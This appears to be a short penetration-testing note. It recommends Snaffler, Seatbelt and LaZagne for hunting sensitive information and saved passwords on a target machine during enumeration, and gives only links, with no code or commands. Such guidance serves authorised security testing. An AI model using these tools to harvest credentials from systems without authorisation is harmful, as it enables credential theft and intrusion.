The following tools may be worth trying to scan a target machine (files, memory, etc.) for hunting sensitive information. We suggest trying them out in the enumeration stage.

- [Snaffler](https://github.com/SnaffCon/Snaffler)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [Lazagne](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)


